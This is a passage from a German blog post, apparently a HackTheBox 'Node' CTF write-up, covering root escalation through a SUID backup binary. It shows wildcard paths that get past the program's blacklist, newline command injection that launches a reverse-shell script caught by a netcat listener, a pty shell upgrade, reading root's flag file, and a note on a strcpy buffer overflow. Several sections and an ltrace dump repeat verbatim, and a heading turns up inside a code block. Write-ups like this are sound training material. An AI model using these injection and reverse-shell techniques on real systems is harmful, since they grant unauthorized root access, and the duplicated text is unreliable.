+</span></span></code></pre></div><p>Das 3. Argument gibt also an, von welchem Verzeichnis ( oder welcher Datei ) eine Zip Datei erstellt werden soll. Dafür wird der Befehl <strong>system()</strong> benutzt. Außerdem wird das 3. Argument mit <strong>.. /root ; &amp; ` $ | //</strong> und <strong>/etc</strong> verglichen. Wenn das 3. Argument einen dieser Strings enthält, bekommen wir eine Zip Datei, welche nur ein Trollface enthält.</p>
+<p>Jetzt gibt es verschiedene Methoden wie wir vorgehen können.</p>
+<h2 id="1-wildcards">1. Wildcards</h2>
+<p>Das ist die einfachste Methode. Wir wollen an den Inhalt von <strong>/root/root.txt</strong>, aber <strong>/root</strong> ist auf der Blacklist. Um diese zu entgehen können wir <a href="https://wiki.ubuntuusers.de/Bash/#Wildcards">Wildcards</a> benutzen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r??t/r??t.txt
+</span></span></code></pre></div><p>oder</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r*t/r*t.txt
+</span></span></code></pre></div><h2 id="2-newline">2. Newline</h2>
+<p>Zuerst ändern wir den Port bei unserem Reverse Shell Skript <strong>/tmp/reverse.js</strong>. Dann lassen wir NetCat diesen Port abhören.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4445</span>
+</span></span></code></pre></div><p>Jetzt können wir als 3. Argument <strong>\n</strong> benutzen, damit <strong>system()</strong> einen weiteren Befehl ausführt. Z.B. unser Skript.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4445</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.52<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.58<span style="color:#f92672">]</span> <span style="color:#ae81ff">55838</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@node:/usr/local/bin# cat /root/root.txt
+</span></span><span style="display:flex;"><span>172#########ZENSIERT#########be0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@node:/usr/local/bin# cat /home/tom/user.txt
+</span></span><span style="display:flex;"><span>e11#########ZENSIERT#########1b1
+</span></span></code></pre></div><h2 id="3-buffer-overflow">3. Buffer Overflow</h2>
+<p>Es wird mehrmals <strong>strcpy</strong> aufgerufen, allerdings wird nicht die Begrenzung überprüft. In der <strong>displayTarget</strong> Funktion tritt dann ein <strong>overflow</strong> und ein <strong>segfault</strong> auf. Damit dies passiert müssen folgende 3 Kriterien erfüllt werden.</p>
+<ol>
+<li>Das 1. muss ungleich <strong>-q</strong> sein, damit das Programm nicht im quiet mode gestartet wird.</li>
+<li>Das 2. Argument muss einen gültigen Key enthalten</li>
+<li>Das 3. Argument enthält einen 508 characters langen String.</li>
+</ol>
+<p>Vielen Dank für&rsquo;s durchlesen. :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strchr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strstr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;//&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> strstr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;/etc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strcpy<span style="color:#f92672">(</span>0xffb1c24b, <span style="color:#e6db74">&#34;arg3&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c24b getpid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6034</span> time<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1520597049</span> clock<span style="color:#f92672">(</span>0, 0, 0, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">7799</span> srand<span style="color:#f92672">(</span>0x4885486b, 0xc864d874, 0x4885486b, 0x804918c<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> rand<span style="color:#f92672">(</span>0, 0, 0, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xb41e2b0 sprintf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span>, <span style="color:#e6db74">&#34;/tmp/.backup_%i&#34;</span>, 188867248<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">22</span> sprintf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 &gt; /dev/null&#34;</span>, <span style="color:#e6db74">&#34;/usr/bin/zip -r -P magicword %s %s &gt; /dev/null&#34;</span>, <span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span>, <span style="color:#e6db74">&#34;arg3&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">65</span> system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 &gt; /dev/null&#34;</span> &lt;no <span style="color:#66d9ef">return</span> ...&gt; --- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> --- &lt;... system resumed&gt; <span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3072</span> access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span>, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 remove<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 fclose<span style="color:#f92672">(</span>0x9881160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> +++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>Das 3. Argument gibt also an, von welchem Verzeichnis ( oder welcher Datei ) eine Zip Datei erstellt werden soll. Dafür wird der Befehl <strong>system()</strong> benutzt. Außerdem wird das 3. Argument mit <strong>.. /root ; &amp; ` $ | //</strong> und <strong>/etc</strong> verglichen. Wenn das 3. Argument einen dieser Strings enthält, bekommen wir eine Zip Datei, welche nur ein Trollface enthält.</p>
+<p>Jetzt gibt es verschiedene Methoden wie wir vorgehen können.</p>
+<h2 id="1-wildcards-1">1. Wildcards</h2>
+<p>Das ist die einfachste Methode. Wir wollen an den Inhalt von <strong>/root/root.txt</strong>, aber <strong>/root</strong> ist auf der Blacklist. Um diese zu entgehen können wir <a href="https://wiki.ubuntuusers.de/Bash/#Wildcards">Wildcards</a> benutzen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r??t/r??t.txt
+</span></span></code></pre></div><p>oder</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r*t/r*t.txt
+</span></span></code></pre></div><h2 id="2-newline-1">2. Newline</h2>
+<p>Zuerst ändern wir den Port bei unserem Reverse Shell Skript <strong>/tmp/reverse.js</strong>. Dann lassen wir NetCat diesen Port abhören.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>shell
+</span></span></code></pre></div><p>Jetzt können wir als 3. Argument <strong>\n</strong> benutzen, damit <strong>system()</strong> einen weiteren Befehl ausführt. Z.B. unser Skript.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/usr/local/bin$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4445</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.52<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.58<span style="color:#f92672">]</span> <span style="color:#ae81ff">55838</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>root@node:/usr/local/bin# cat /root/root.txt
+</span></span><span style="display:flex;"><span>172#########ZENSIERT#########be0
+</span></span><span style="display:flex;"><span>root@node:/usr/local/bin# cat /home/tom/user.txt
+</span></span><span style="display:flex;"><span>e11#########ZENSIERT#########1b1
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## 3\. Buffer Overflow</span>
+</span></span></code></pre></div><p>Es wird mehrmals <strong>strcpy</strong> aufgerufen, allerdings wird nicht die Begrenzung überprüft. In der <strong>displayTarget</strong> Funktion tritt dann ein <strong>overflow</strong> und ein <strong>segfault</strong> auf. Damit dies passiert müssen folgende 3 Kriterien erfüllt werden.</p>
+<ol>
+<li>Das 1. muss ungleich <strong>-q</strong> sein, damit das Programm nicht im quiet mode gestartet wird.</li>
+<li>Das 2. Argument muss einen gültigen Key enthalten</li>
+<li>Das 3. Argument enthält einen 508 characters langen String.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strchr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strstr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;//&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> strstr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;/etc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil strcpy<span style="color:#f92672">(</span>0xffb1c24b, <span style="color:#e6db74">&#34;arg3&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c24b getpid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6034</span> time<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1520597049</span> clock<span style="color:#f92672">(</span>0, 0, 0, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">7799</span> srand<span style="color:#f92672">(</span>0x4885486b, 0xc864d874, 0x4885486b, 0x804918c<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> rand<span style="color:#f92672">(</span>0, 0, 0, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xb41e2b0 sprintf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span>, <span style="color:#e6db74">&#34;/tmp/.backup_%i&#34;</span>, 188867248<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">22</span> sprintf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 &gt; /dev/null&#34;</span>, <span style="color:#e6db74">&#34;/usr/bin/zip -r -P magicword %s %s &gt; /dev/null&#34;</span>, <span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span>, <span style="color:#e6db74">&#34;arg3&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">65</span> system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/usr/bin/zip -r -P magicword /tmp/.backup_188867248 arg3 &gt; /dev/null&#34;</span> &lt;no <span style="color:#66d9ef">return</span> ...&gt; --- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> --- &lt;... system resumed&gt; <span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3072</span> access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span>, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 remove<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/.backup_188867248&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 fclose<span style="color:#f92672">(</span>0x9881160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> +++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>Das 3. Argument gibt also an, von welchem Verzeichnis ( oder welcher Datei ) eine Zip Datei erstellt werden soll. Dafür wird der Befehl <strong>system()</strong> benutzt. Außerdem wird das 3. Argument mit <strong>.. /root ; &amp; ` $ | //</strong> und <strong>/etc</strong> verglichen. Wenn das 3. Argument einen dieser Strings enthält, bekommen wir eine Zip Datei, welche nur ein Trollface enthält.</p>
+<p>Vielen Dank für&rsquo;s durchlesen. :)</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://www.m10x.de/tags/hackthebox/">hackthebox</a></span>
+        <span class="tag"><a href="https://www.m10x.de/tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="https://www.m10x.de/tags/german/">german</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        3021 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2018-03-09 11:10
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;caption=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;canonicalUrl=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;body=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f&amp;media=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f;description=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f&amp;title=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;summary=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;source=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f&amp;resubmit=true&amp;title=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f;title=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung%20https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
